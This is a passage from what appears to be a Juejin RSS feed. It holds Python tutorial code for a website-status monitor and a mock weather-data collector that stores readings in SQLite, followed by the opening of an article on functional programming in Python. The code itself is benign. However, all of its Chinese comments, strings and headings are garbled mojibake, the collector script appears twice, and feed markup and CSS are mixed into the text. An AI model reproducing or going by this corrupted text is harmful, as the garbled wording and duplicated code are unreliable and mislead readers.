        å‘é€è­¦æŠ¥ï¼ˆè¿™é‡Œæ‰“å°åˆ°æ§åˆ¶å°ï¼Œå®é™…ä½¿ç”¨æ—¶å¯ä»¥å‘é€é‚®ä»¶ï¼‰
        """</span>
        timestamp = datetime.now().strftime(<span class="hljs-string">"%Y-%m-%d %H:%M:%S"</span>)
        alert_message = <span class="hljs-string">f"[<span class="hljs-subst">{timestamp}</span>] è­¦æŠ¥: <span class="hljs-subst">{website_name}</span> - <span class="hljs-subst">{status}</span>\nè¯¦æƒ…: <span class="hljs-subst">{message}</span>"</span>
        <span class="hljs-built_in">print</span>(alert_message)
        
        <span class="hljs-comment"># åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œè¿™é‡Œå¯ä»¥æ·»åŠ é‚®ä»¶å‘é€ä»£ç </span>
        <span class="hljs-comment"># self.send_email_alert(website_name, status, message)</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">monitor_websites</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""
        å¼€å§‹ç›‘æ§ç½‘ç«™
        """</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼€å§‹ç›‘æ§ <span class="hljs-subst">{<span class="hljs-built_in">len</span>(self.websites)}</span> ä¸ªç½‘ç«™..."</span>)
        
        <span class="hljs-keyword">try</span>:
            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
                <span class="hljs-keyword">for</span> website <span class="hljs-keyword">in</span> self.websites:
                    name = website[<span class="hljs-string">'name'</span>]
                    url = website[<span class="hljs-string">'url'</span>]
                    
                    <span class="hljs-comment"># æ£€æŸ¥ç½‘ç«™çŠ¶æ€</span>
                    is_online, status = self.check_website_status(url)
                    current_status = <span class="hljs-string">"åœ¨çº¿"</span> <span class="hljs-keyword">if</span> is_online <span class="hljs-keyword">else</span> <span class="hljs-string">"ç¦»çº¿"</span>
                    
                    <span class="hljs-comment"># æ£€æŸ¥çŠ¶æ€å˜åŒ–</span>
                    previous_status = self.status_history.get(name)
                    <span class="hljs-keyword">if</span> previous_status != current_status:
                        <span class="hljs-keyword">if</span> previous_status <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># ä¸æ˜¯ç¬¬ä¸€æ¬¡æ£€æŸ¥</span>
                            self.send_alert(name, current_status, <span class="hljs-string">f"çŠ¶æ€ç : <span class="hljs-subst">{status}</span>"</span>)
                        
                        self.status_history[name] = current_status
                    
                    <span class="hljs-comment"># è¾“å‡ºçŠ¶æ€ä¿¡æ¯</span>
                    status_icon = <span class="hljs-string">"âœ…"</span> <span class="hljs-keyword">if</span> is_online <span class="hljs-keyword">else</span> <span class="hljs-string">"âŒ"</span>
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{status_icon}</span> <span class="hljs-subst">{name}</span>: <span class="hljs-subst">{current_status}</span> (<span class="hljs-subst">{status}</span>)"</span>)
                
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç­‰å¾… <span class="hljs-subst">{self.check_interval}</span> ç§’åå†æ¬¡æ£€æŸ¥...\n"</span>)
                time.sleep(self.check_interval)
                
        <span class="hljs-keyword">except</span> KeyboardInterrupt:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nç½‘ç«™ç›‘æ§å·²åœæ­¢"</span>)

<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
websites_to_monitor = [
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'è°·æ­Œ'</span>, <span class="hljs-string">'url'</span>: <span class="hljs-string">'https://www.google.com'</span>},
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'GitHub'</span>, <span class="hljs-string">'url'</span>: <span class="hljs-string">'https://www.github.com'</span>},
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'ç¨€åœŸæ˜é‡‘'</span>, <span class="hljs-string">'url'</span>: <span class="hljs-string">'https://juejin.cn'</span>}
]

monitor = WebsiteMonitor(websites_to_monitor, check_interval=<span class="hljs-number">60</span>)
<span class="hljs-comment"># monitor.monitor_websites()  # å–æ¶ˆæ³¨é‡Šæ¥è¿è¡Œ</span>
</code></pre>
<h3 data-id="heading-4">è‡ªåŠ¨åŒ–æ•°æ®æ”¶é›†è„šæœ¬</h3>
<pre><code class="hljs language-pythonimport" lang="pythonimport">import json
import csv
import sqlite3
from datetime import datetime

class DataCollector:
    def __init__(self, db_path="collected_data.db"):
        self.db_path = db_path
        self.setup_database()
    
    def setup_database(self):
        """è®¾ç½®SQLiteæ•°æ®åº“"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # åˆ›å»ºæ•°æ®è¡¨
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS weather_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                city TEXT NOT NULL,
                temperature REAL,
                humidity INTEGER,
                description TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        print("æ•°æ®åº“åˆå§‹åŒ–å®Œæˆ")
    
    def get_weather_data(self, city):
        """è·å–å¤©æ°”æ•°æ®ï¼ˆæ¨¡æ‹ŸAPIè°ƒç”¨ï¼‰"""
        # è¿™é‡Œä½¿ç”¨æ¨¡æ‹Ÿæ•°æ®ï¼Œå®é™…ä½¿ç”¨æ—¶å¯ä»¥è°ƒç”¨çœŸå®å¤©æ°”API
        weather_data = {
            'åŒ—äº¬': {'temperature': 25.5, 'humidity': 60, 'description': 'æ™´æœ—'},
            'ä¸Šæµ·': {'temperature': 28.0, 'humidity': 75, 'description': 'å¤šäº‘'},
            'å¹¿å·': {'temperature': 32.5, 'humidity': 80, 'description': 'é˜µé›¨'},
            'æ·±åœ³': {'temperature': 31.0, 'humidity': 78, 'description': 'é˜´å¤©'}
        }
        
        return weather_data.get(city, {'temperature': 0, 'humidity': 0, 'description': 'æœªçŸ¥'})
    
    def collect_weather_data(self, cities):
        """æ”¶é›†å¤šä¸ªåŸå¸‚çš„å¤©æ°”æ•°æ®"""
        collected_data = []
        
        for city in cities:
            print(f"æ­£åœ¨æ”¶é›† {city} çš„å¤©æ°”æ•°æ®...")
            weather = self.get_weather_data(city)
            
            data_point = {
                'city': city,
                'temperature': weather['temperature'],
                'humidity': weather['humidity'],
                'description': weather['description'],
                'timestamp': datetime.now()
            }
            
            collected_data.append(data_point)
            
            # ä¿å­˜åˆ°æ•°æ®åº“
            self.save_to_database(data_point)
        
        return collected_data
    
    def save_to_database(self, data):
        """ä¿å­˜æ•°æ®åˆ°æ•°æ®åº“"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO weather_data (city, temperature, humidity, description)
            VALUES (?, ?, ?, ?)
        ''', (data['city'], data['temperature'], data['humidity'], data['description']))
        
        conn.commit()
        conn.close()
    
    def export_to_csv(self, filename="weather_data.csv"):
        """å¯¼å‡ºæ•°æ®åˆ°CSVæ–‡ä»¶"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM weather_data')
        data = cursor.fetchall()
        
        with open(filename, 'w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            
            # å†™å…¥è¡¨å¤´
            writer.writerow(['ID', 'åŸå¸‚', 'æ¸©åº¦', 'æ¹¿åº¦', 'æè¿°', 'æ—¶é—´'])
            
            # å†™å…¥æ•°æ®
            for row in data:
                writer.writerow(row)
        
        conn.close()
        print(f"æ•°æ®å·²å¯¼å‡ºåˆ° {filename}")
    
    def generate_report(self):
        """ç”Ÿæˆæ•°æ®æŠ¥å‘Š"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # ç»Ÿè®¡å„åŸå¸‚å¹³å‡æ¸©åº¦
        cursor.execute('''
            SELECT city, 
                   AVG(temperature) as avg_temp,
                   AVG(humidity) as avg_humidity,
                   COUNT(*) as data_count
            FROM weather_data 
            GROUP BY city
        ''')
        
        stats = cursor.fetchall()
        
        print("\n=== å¤©æ°”æ•°æ®ç»Ÿè®¡æŠ¥å‘Š ===")
        for city, avg_temp, avg_humidity, count in stats:
            print(f"{city}:")
            print(f"  å¹³å‡æ¸©åº¦: {avg_temp:.1f}Â°C")
            print(f"  å¹³å‡æ¹¿åº¦: {avg_humidity:.1f}%")
            print(f"  æ•°æ®ç‚¹æ•°: {count}")
            print()
        
        conn.close()

# ä½¿ç”¨ç¤ºä¾‹
collector = DataCollector()

# æ”¶é›†æ•°æ®
cities = ['åŒ—äº¬', 'ä¸Šæµ·', 'å¹¿å·', 'æ·±åœ³']
weather_data = collector.collect_weather_data(cities)

print("æ”¶é›†åˆ°çš„å¤©æ°”æ•°æ®:")
for data in weather_data:
    print(f"{data['city']}: {data['temperature']}Â°C, {data['humidity']}%, {data['description']}")

# ç”ŸæˆæŠ¥å‘Šå’Œå¯¼å‡ºæ•°æ®
collector.generate_report()
collector.export_to_csv()
import requests
import json
import csv
import sqlite3
from datetime import datetime

class DataCollector:
    def __init__(self, db_path="collected_data.db"):
        self.db_path = db_path
        self.setup_database()
    
    def setup_database(self):
        """è®¾ç½®SQLiteæ•°æ®åº“"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # åˆ›å»ºæ•°æ®è¡¨
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS weather_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                city TEXT NOT NULL,
                temperature REAL,
                humidity INTEGER,
                description TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        print("æ•°æ®åº“åˆå§‹åŒ–å®Œæˆ")
    
    def get_weather_data(self, city):
        """è·å–å¤©æ°”æ•°æ®ï¼ˆæ¨¡æ‹ŸAPIè°ƒç”¨ï¼‰"""
        # è¿™é‡Œä½¿ç”¨æ¨¡æ‹Ÿæ•°æ®ï¼Œå®é™…ä½¿ç”¨æ—¶å¯ä»¥è°ƒç”¨çœŸå®å¤©æ°”API
        weather_data = {
            'åŒ—äº¬': {'temperature': 25.5, 'humidity': 60, 'description': 'æ™´æœ—'},
            'ä¸Šæµ·': {'temperature': 28.0, 'humidity': 75, 'description': 'å¤šäº‘'},
            'å¹¿å·': {'temperature': 32.5, 'humidity': 80, 'description': 'é˜µé›¨'},
            'æ·±åœ³': {'temperature': 31.0, 'humidity': 78, 'description': 'é˜´å¤©'}
        }
        
        return weather_data.get(city, {'temperature': 0, 'humidity': 0, 'description': 'æœªçŸ¥'})
    
    def collect_weather_data(self, cities):
        """æ”¶é›†å¤šä¸ªåŸå¸‚çš„å¤©æ°”æ•°æ®"""
        collected_data = []
        
        for city in cities:
            print(f"æ­£åœ¨æ”¶é›† {city} çš„å¤©æ°”æ•°æ®...")
            weather = self.get_weather_data(city)
            
            data_point = {
                'city': city,
                'temperature': weather['temperature'],
                'humidity': weather['humidity'],
                'description': weather['description'],
                'timestamp': datetime.now()
            }
            
            collected_data.append(data_point)
            
            # ä¿å­˜åˆ°æ•°æ®åº“
            self.save_to_database(data_point)
        
        return collected_data
    
    def save_to_database(self, data):
        """ä¿å­˜æ•°æ®åˆ°æ•°æ®åº“"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO weather_data (city, temperature, humidity, description)
            VALUES (?, ?, ?, ?)
        ''', (data['city'], data['temperature'], data['humidity'], data['description']))
        
        conn.commit()
        conn.close()
    
    def export_to_csv(self, filename="weather_data.csv"):
        """å¯¼å‡ºæ•°æ®åˆ°CSVæ–‡ä»¶"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM weather_data')
        data = cursor.fetchall()
        
        with open(filename, 'w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            
            # å†™å…¥è¡¨å¤´
            writer.writerow(['ID', 'åŸå¸‚', 'æ¸©åº¦', 'æ¹¿åº¦', 'æè¿°', 'æ—¶é—´'])
            
            # å†™å…¥æ•°æ®
            for row in data:
                writer.writerow(row)
        
        conn.close()
        print(f"æ•°æ®å·²å¯¼å‡ºåˆ° {filename}")
    
    def generate_report(self):
        """ç”Ÿæˆæ•°æ®æŠ¥å‘Š"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # ç»Ÿè®¡å„åŸå¸‚å¹³å‡æ¸©åº¦
        cursor.execute('''
            SELECT city, 
                   AVG(temperature) as avg_temp,
                   AVG(humidity) as avg_humidity,
                   COUNT(*) as data_count
            FROM weather_data 
            GROUP BY city
        ''')
        
        stats = cursor.fetchall()
        
        print("\n=== å¤©æ°”æ•°æ®ç»Ÿè®¡æŠ¥å‘Š ===")
        for city, avg_temp, avg_humidity, count in stats:
            print(f"{city}:")
            print(f"  å¹³å‡æ¸©åº¦: {avg_temp:.1f}Â°C")
            print(f"  å¹³å‡æ¹¿åº¦: {avg_humidity:.1f}%")
            print(f"  æ•°æ®ç‚¹æ•°: {count}")
            print()
        
        conn.close()

# ä½¿ç”¨ç¤ºä¾‹
collector = DataCollector()

# æ”¶é›†æ•°æ®
cities = ['åŒ—äº¬', 'ä¸Šæµ·', 'å¹¿å·', 'æ·±åœ³']
weather_data = collector.collect_weather_data(cities)

print("æ”¶é›†åˆ°çš„å¤©æ°”æ•°æ®:")
for data in weather_data:
    print(f"{data['city']}: {data['temperature']}Â°C, {data['humidity']}%, {data['description']}")

# ç”ŸæˆæŠ¥å‘Šå’Œå¯¼å‡ºæ•°æ®
collector.generate_report()
collector.export_to_csv()
</code></pre>
<h2 data-id="heading-5">è‡ªåŠ¨åŒ–è„šæœ¬å¼€å‘åŸåˆ™</h2>
<ol>
<li>å¯é æ€§è®¾è®¡</li>
<li>ç”¨æˆ·ä½“éªŒ</li>
<li>ç»´æŠ¤æ€§è€ƒè™‘</li>
<li>å®‰å…¨æ€§ä¿éšœ</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pythonå‡½æ•°å¼ç¼–ç¨‹ï¼šä¼˜é›…çš„ä»£ç è‰ºæœ¯]]></title>    <link>https://juejin.cn/post/7576893180080734250</link>    <guid>https://juejin.cn/post/7576893180080734250</guid>    <pubDate>2025-11-26T16:17:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576893180080734250" data-draft-id="7576859345935614006" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pythonå‡½æ•°å¼ç¼–ç¨‹ï¼šä¼˜é›…çš„ä»£ç è‰ºæœ¯"/> <meta itemprop="keywords" content="Python,PyCharm"/> <meta itemprop="datePublished" content="2025-11-26T16:17:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BBBåŠªåŠ›å­¦ä¹ ç¨‹åºè®¾è®¡"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pythonå‡½æ•°å¼ç¼–ç¨‹ï¼šä¼˜é›…çš„ä»£ç è‰ºæœ¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BBBåŠªåŠ›å­¦ä¹ ç¨‹åºè®¾è®¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-26T16:17:30.000Z" title="Wed Nov 26 2025 16:17:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-26
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><p>æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœç¼–ç¨‹å°±åƒæ­ç§¯æœ¨ä¸€æ ·ï¼Œé€šè¿‡ç»„åˆç®€å•çš„æ¨¡å—æ¥æ„å»ºå¤æ‚çš„åŠŸèƒ½ï¼Œè€Œä¸æ˜¯ç¼–å†™å†—é•¿çš„æŒ‡ä»¤åºåˆ—ã€‚è¿™æ­£æ˜¯å‡½æ•°å¼ç¼–ç¨‹çš„é­…åŠ›æ‰€åœ¨ï¼å®ƒä¸ä»…ä»…æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œæ›´æ˜¯ä¸€ç§æ€ç»´æ–¹å¼ï¼Œè®©ä»£ç å˜å¾—æ›´ç®€æ´ã€æ›´å¯é¢„æµ‹ã€æ›´æ˜“äºç†è§£ã€‚</p>
<h2 data-id="heading-0">å‡½æ•°å¼ç¼–ç¨‹çš„æ ¸å¿ƒç†å¿µ</h2>
<ul>
<li>ä¸å˜æ€§ï¼šæ•°æ®çš„å®‰å…¨ä¿éšœ</li>
<li>çº¯å‡½æ•°ï¼šç›¸åŒçš„è¾“å…¥ï¼Œæ°¸è¿œå¾—åˆ°ç›¸åŒçš„è¾“å‡º</li>
<li>å‡½æ•°æ˜¯æœ€é‡è¦çš„</li>
</ul>
<h2 data-id="heading-1">å®æˆ˜ä»£ç ï¼šå‡½æ•°å¼ç¼–ç¨‹çš„å®è·µ</h2>
<h3 data-id="heading-2">åŸºç¡€å‡½æ•°å¼æ“ä½œ</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼ ç»Ÿæ–¹å¼ vs å‡½æ•°å¼æ–¹å¼</span>

<span class="hljs-comment"># ä¼ ç»Ÿå‘½ä»¤å¼ç¼–ç¨‹</span>
numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>]

<span class="hljs-comment"># ç­›é€‰å¶æ•°å¹¶è®¡ç®—å¹³æ–¹</span>
result_imperative = []
<span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> numbers:
    <span class="hljs-keyword">if</span> num % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:
        result_imperative.append(num ** <span class="hljs-number">2</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‘½ä»¤å¼ç»“æœ: <span class="hljs-subst">{result_imperative}</span>"</span>)

<span class="hljs-comment"># å‡½æ•°å¼ç¼–ç¨‹æ–¹å¼</span>
result_functional = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x ** <span class="hljs-number">2</span>, 
                           <span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>, numbers)))

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‡½æ•°å¼ç»“æœ: <span class="hljs-subst">{result_functional}</span>"</span>)

<span class="hljs-comment"># æ›´æ¸…æ™°çš„å†™æ³•ï¼ˆä½¿ç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼ï¼‰</span>
result_clear = [x ** <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> numbers <span class="hljs-keyword">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>]
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¸…æ™°å†™æ³•: <span class="hljs-subst">{result_clear}</span>"</span>)
</code></pre>
<h3 data-id="heading-3">é«˜é˜¶å‡½æ•°åº”ç”¨</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Callable</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">compose</span>(<span class="hljs-params">*functions: <span class="hljs-type">Callable</span></span>) -&gt; <span class="hljs-type">Callable</span>:
    <span class="hljs-string">"""å‡½æ•°ç»„åˆï¼šå°†å¤šä¸ªå‡½æ•°ç»„åˆæˆä¸€ä¸ªæ–°å‡½æ•°"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">composed</span>(<span class="hljs-params">arg</span>):
        result = arg
        <span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(functions):
            result = func(result)
        <span class="hljs-keyword">return</span> result
    <span class="hljs-keyword">return</span> composed

<span class="hljs-keyword">def</span> <span class="hljs-title function_">pipe</span>(<span class="hljs-params">*functions: <span class="hljs-type">Callable</span></span>) -&gt; <span class="hljs-type">Callable</span>:
    <span class="hljs-string">"""ç®¡é“æ“ä½œï¼šä»å·¦åˆ°å³æ‰§è¡Œå‡½æ•°åºåˆ—"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">piped</span>(<span class="hljs-params">arg</span>):
        result = arg
        <span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> functions:
            result = func(result)
        <span class="hljs-keyword">return</span> result
    <span class="hljs-keyword">return</span> piped

<span class="hljs-comment"># åˆ›å»ºä¸€äº›å°çš„çº¯å‡½æ•°</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Callable</span>[[<span class="hljs-built_in">int</span>], <span class="hljs-built_in">int</span>]:
    <span class="hljs-string">"""æŸ¯é‡ŒåŒ–çš„åŠ æ³•å‡½æ•°"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">lambda</span> y: x + y

<span class="hljs-keyword">def</span> <span class="hljs-title function_">multiply</span>(<span class="hljs-params">x: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Callable</span>[[<span class="hljs-built_in">int</span>], <span class="hljs-built_in">int</span>]:
    <span class="hljs-string">"""æŸ¯é‡ŒåŒ–çš„ä¹˜æ³•å‡½æ•°"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">lambda</span> y: x * y

<span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_even</span>(<span class="hljs-params">numbers: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:
    <span class="hljs-string">"""ç­›é€‰å¶æ•°"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>, numbers))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">square_all</span>(<span class="hljs-params">numbers: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]:
    <span class="hljs-string">"""å¯¹æ‰€æœ‰æ•°å­—æ±‚å¹³æ–¹"""</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x ** <span class="hljs-number">2</span>, numbers))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">sum_all</span>(<span class="hljs-params">numbers: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""æ±‚å’Œ"""</span>
    <span class="hljs-keyword">return</span> reduce(<span class="hljs-keyword">lambda</span> x, y: x + y, numbers, <span class="hljs-number">0</span>)

